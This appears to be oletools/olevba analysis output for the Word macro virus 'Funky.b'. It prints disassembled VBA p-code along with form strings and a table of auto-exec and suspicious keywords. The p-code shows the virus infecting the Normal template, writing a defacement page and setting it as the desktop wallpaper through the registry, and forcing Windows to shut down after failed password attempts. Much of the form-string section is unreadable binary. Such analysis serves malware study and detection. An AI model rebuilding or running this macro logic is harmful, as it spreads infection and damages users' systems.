' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0012 "Grunge1981.CallDoc"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #363:
' 	LitStr 0x0019 "normal.Grunge1981.CallDoc"
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #364:
' 	LitStr 0x000D "NineTeen80One"
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #365:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #366:
' 	OnError (Resume Next) 
' Line #367:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Not 
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #368:
' 	EndIfBlock 
' Line #369:
' 	ElseBlock 
' Line #370:
' 	Ld NormalTemplate 
' 	ArgsCall Grunge_Clear 0x0001 
' Line #371:
' 	ArgsCall CallNormal 0x0000 
' Line #372:
' 	OnError (Resume Next) 
' Line #373:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #374:
' 	EndIfBlock 
' Line #375:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	Ld msoBarNoCustomize 
' 	Ld I 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Protection 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #376:
' Line #377:
' 	EndSub 
' Line #378:
' Line #379:
' 	FuncDefn (Sub BackGround())
' Line #380:
' 	Dim 
' 	VarDefn RootsyS (As String)
' Line #381:
' 	OnError (Resume Next) 
' Line #382:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St RootsyS 
' Line #383:
' 	Ld RootsyS 
' 	LitStr 0x0009 "\1981.htm"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #384:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "<html><head>"
' 	PrintItemNL 
' Line #385:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "<meta http-equiv='Content-Type'"
' 	PrintItemNL 
' Line #386:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "content='text/html; charset=iso-8859-1'>"
' 	PrintItemNL 
' Line #387:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "</head>"
' 	PrintItemNL 
' Line #388:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "<body bgcolor='#000000' text='#FFFFFF'>"
' 	PrintItemNL 
' Line #389:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "<p align='center'><font color='#FF0000' size='5' face='Arial'><strong>Nìñè"
' 	PrintItemNL 
' Line #390:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "Tèèñ 80 Oñè is Back</strong></font></p>"
' 	PrintItemNL 
' Line #391:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003C "<p align='center'>©reated Nìñè Tèèñ 80 Oñè 2001, Bandung</p>"
' 	PrintItemNL 
' Line #392:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "<p align='center'>Show me what you got</p>"
' 	PrintItemNL 
' Line #393:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "<table border='2'> <tr>"
' 	PrintItemNL 
' Line #394:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0042 "<td><img src='\..\..\Logo.sys' width='751' height='327'></td></tr>"
' 	PrintItemNL 
' Line #395:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "</table>"
' 	PrintItemNL 
' Line #396:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0041 "<p align='center'>I Hate Nobody If Nobody Not Like Me And I Don't"
' 	PrintItemNL 
' Line #397:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "Trust Nobody If Nobody Hate Me</p>"
' 	PrintItemNL 
' Line #398:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x005A "<p align='center'><a href='http://www.1981.com'><font size='5'>www.1981.com</font></a></p>"
' 	PrintItemNL 
' Line #399:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "</body></html>"
' 	PrintItemSemi 
' 	LitR8 0x0000 0x0000 0xF400 0x409E 
' 	PrintItemSemi 
' 	Ld htm 
' 	PrintItemNL 
' Line #400:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #401:
' 	Ld RootsyS 
' 	LitStr 0x0009 "\1981.htm"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #402:
' 	EndSub 
' Macros/VBA/Frm1981 - 4467 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' 	FuncDefn (Private Sub CmdCancel_Click())
' Line #43:
' 	Ld Frm1981 
' 	ArgsCall Unlock 0x0001 
' Line #44:
' 	Ld ThisDay 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' 	BoS 0x0000 
' 	ExitSub 
' 	EndIf 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Private Sub CmdOK_Click())
' Line #47:
' 	OnError (Resume Next) 
' Line #48:
' 	Ld TxtUser 
' 	MemLd Then 
' 	Ld Label4 
' 	MemLd Caption 
' 	Eq 
' 	Ld TxtUser 
' 	MemLd Then 
' 	LitStr 0x0009 "Macro$oft"
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld TxtPas 
' 	MemLd Then 
' 	LitStr 0x000E "70107334652001"
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #49:
' 	LitStr 0x0022 "Thank you, password is true......."
' 	LitDI2 0x0030 
' 	LitStr 0x000B "Infrmation "
' 	ArgsCall MsgBox 0x0003 
' Line #50:
' 	Ld ThisDay 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #51:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #52:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #53:
' 	LitDI2 0x0000 
' 	St CekPas 
' Line #54:
' 	Ld Frm1981 
' 	ArgsCall Unlock 0x0001 
' Line #55:
' 	ExitSub 
' Line #56:
' 	ElseBlock 
' Line #57:
' 	LitDI2 0x0000 
' 	St CekPas 
' Line #58:
' 	LitVarSpecial (False)
' 	St ThisDay 
' Line #59:
' 	Ld Frm1981 
' 	ArgsCall Unlock 0x0001 
' Line #60:
' 	Ld Application 
' 	ArgsMemCall ShowMe 0x0000 
' Line #61:
' 	ExitSub 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	ElseBlock 
' Line #64:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #65:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #66:
' 	LitStr 0x0031 " Your Password in invalid, please try again......"
' 	ArgsCall MsgBox 0x0001 
' Line #67:
' 	LitStr 0x0000 ""
' 	St TxtUser 
' Line #68:
' 	LitStr 0x0000 ""
' 	St TxtPas 
' Line #69:
' 	Ld TxtUser 
' 	ArgsMemCall SetFocus 0x0000 
' Line #70:
' 	Ld CekPas 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #71:
' 	Ld ThisDay 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' 	BoS 0x0000 
' 	ExitSub 
' 	EndIf 
' Line #72:
' 	LitStr 0x0029 "I Kill You Now........,bye...bye...bye..."
' 	LitDI2 0x0030 
' 	LitStr 0x001A "Nine Teen 80 One Warning !"
' 	ArgsCall MsgBox 0x0003 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall ExitWindowsEx 0x0002 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	Ld CekPas 
' 	LitDI2 0x0001 
' 	Add 
' 	St CekPas 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	EndSub 
' Line #78:
' 	FuncDefn (Private Sub TxtPas_Change())
' Line #79:
' 	ArgsCall TxtUser_Change 0x0000 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Private Sub TxtUser_Change())
' Line #82:
' 	Ld TxtUser 
' 	MemLd Then 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld TxtPas 
' 	MemLd Then 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	Ld CmdOK 
' 	MemSt Enabled 
' Line #83:
' 	EndSub 
' Line #84:
' 	FuncDefn (Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer))
' Line #85:
' 	Ld ThisDay 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #86:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Administrator Name :�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Administrator Password :�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N��� T��� 80 O��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cancel@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���??�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM Variable "b'CmdOK'" IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TxtUser'" IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'TxtPas'" IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CmdCancel'" IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image2'" IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'lblday'" IN 'Virus.MSWord.Funky.b' - OLE stream: 'Macros/Frm1981'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CmdCancel_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |TxtPas_Change       |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Register            |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.1981.com |URL                                          |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |Global.inf          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

